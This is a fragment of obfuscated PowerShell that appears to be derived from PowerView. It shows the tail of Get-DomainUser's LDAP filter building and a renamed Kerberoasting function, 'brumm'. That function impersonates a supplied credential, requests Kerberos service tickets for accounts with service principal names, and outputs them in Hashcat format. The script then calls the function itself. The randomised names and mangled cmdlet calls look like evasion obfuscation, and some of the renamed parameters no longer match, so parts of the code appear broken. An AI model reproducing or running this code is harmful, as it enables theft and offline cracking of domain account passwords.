            if ($x4kPe -and (<obfus%$%x%4%k%P%e%.%T%r%i%m%(%)%cate> -ne '') ) {
                $3D1h7NvHQPsOML5ZFlk += "(|$x4kPe)"
            }

            if ($PSBoundParameters['SPN']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-DomainUser] Searching for non-null service principal names'
                $3D1h7NvHQPsOML5ZFlk += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-DomainUser] Searching for users who can be delegated'
                
                $3D1h7NvHQPsOML5ZFlk += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if ($PSBoundParameters['DisallowDelegation']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                $3D1h7NvHQPsOML5ZFlk += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if ($PSBoundParameters['AdminCount']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-DomainUser] Searching for adminCount=1'
                $3D1h7NvHQPsOML5ZFlk += '(admincount=1)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                $3D1h7NvHQPsOML5ZFlk += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['PreauthNotRequired']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                $3D1h7NvHQPsOML5ZFlk += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainUser] Using additional LDAP filter: $k5vUxK9ln8"
                $3D1h7NvHQPsOML5ZFlk += "$k5vUxK9ln8"
            }

            
            $MjUHkTBIetVbSqolpWgZ5X | <obfus%W%h%e%r%e%-%O%b%j%e%c%t%cate> {$_} | <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> {
                if ($_ -match 'NOT_.*') {
                    $6tz9ZfDFY = $_.Substring(4)
                    $jSLi2aYQJHsRdfUAA0d = [Int]($nv98ITJ::$6tz9ZfDFY)
                    $3D1h7NvHQPsOML5ZFlk += "(!(userAccountControl:1.2.840.113556.1.4.803:=$jSLi2aYQJHsRdfUAA0d))"
                }
                else {
                    $jSLi2aYQJHsRdfUAA0d = [Int]($nv98ITJ::$_)
                    $3D1h7NvHQPsOML5ZFlk += "(userAccountControl:1.2.840.113556.1.4.803:=$jSLi2aYQJHsRdfUAA0d)"
                }
            }

            $pHUs.filter = "(&(samAccountType=805306368)$3D1h7NvHQPsOML5ZFlk)"
            <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainUser] filter string: $($pHUs.filter)"

            if ($PSBoundParameters['FindOne']) { $l3aGh2Vy = <obfus%$%p%H%U%s%.%F%i%n%d%O%n%e%(%)%cate> }
            else { $l3aGh2Vy = <obfus%$%p%H%U%s%.%F%i%n%d%A%l%l%(%)%cate> }
            $l3aGh2Vy | <obfus%W%h%e%r%e%-%O%b%j%e%c%t%cate> {$_} | <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> {
                if ($PSBoundParameters['Raw']) {
                    
                    $FvNpMKL = $_
                    $FvNpMKL.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    $FvNpMKL = Convert-LDAPProperty -dCIllyjgqciZZpbXhob1SpKy $_.Properties
                    $FvNpMKL.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                $FvNpMKL
            }
            if ($l3aGh2Vy) {
                try { <obfus%$%l%3%a%G%h%2%V%y%.%d%i%s%p%o%s%e%(%)%cate> }
                catch {
                    <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            <obfus%$%p%H%U%s%.%d%i%s%p%o%s%e%(%)%cate>
        }
    }
}


function brumm {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $h1eIoJyUYzNxlWkA5SpQbgH,

        [ValidateNotNullOrEmpty()]
        [String]
        $RTMQbe9hcfrIGokY3u8E,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $k5vUxK9ln8,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $rNCDxpT3v,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $eZUZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $ZC48hloYJski = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $1Gtz7axRphsk = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ej,

        [Switch]
        $RCNI1heWx9Gvl4gkqbTDFQ,

        [ValidateRange(0,10000)]
        [Int]
        $x9 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $mueBYAqVhOsgzvK7o2GNt = .3,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $8n6w5he = 'John',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OIeEQqcZGrbyd62 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $pOmyR1UMP = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $pOmyR1UMP['Domain'] = $RTMQbe9hcfrIGokY3u8E }
        if ($PSBoundParameters['LDAPFilter']) { $pOmyR1UMP['LDAPFilter'] = $k5vUxK9ln8 }
        if ($PSBoundParameters['SearchBase']) { $pOmyR1UMP['SearchBase'] = $rNCDxpT3v }
        if ($PSBoundParameters['Server']) { $pOmyR1UMP['Server'] = $eZUZ }
        if ($PSBoundParameters['SearchScope']) { $pOmyR1UMP['SearchScope'] = $ZC48hloYJski }
        if ($PSBoundParameters['ResultPageSize']) { $pOmyR1UMP['ResultPageSize'] = $1Gtz7axRphsk }
        if ($PSBoundParameters['ServerTimeLimit']) { $pOmyR1UMP['ServerTimeLimit'] = $ej }
        if ($PSBoundParameters['Tombstone']) { $pOmyR1UMP['Tombstone'] = $RCNI1heWx9Gvl4gkqbTDFQ }
        if ($PSBoundParameters['Credential']) { $pOmyR1UMP['Credential'] = $OIeEQqcZGrbyd62 }

        if ($PSBoundParameters['Credential']) {
            $N1cX8lS = Invoke-UserImpersonation -OIeEQqcZGrbyd62 $OIeEQqcZGrbyd62
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $pOmyR1UMP['Identity'] = $h1eIoJyUYzNxlWkA5SpQbgH }
        Get-DomainUser @UserSearcherArguments | <obfus%W%h%e%r%e%-%O%b%j%e%c%t%cate> {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -x9 $x9 -8n6w5he $8n6w5he -mueBYAqVhOsgzvK7o2GNt $mueBYAqVhOsgzvK7o2GNt
    }

    END {
        if ($N1cX8lS) {
            Invoke-RevertToSelf -TokenHandle $N1cX8lS
        }
    }
}

brumm -8n6w5he Hashcat

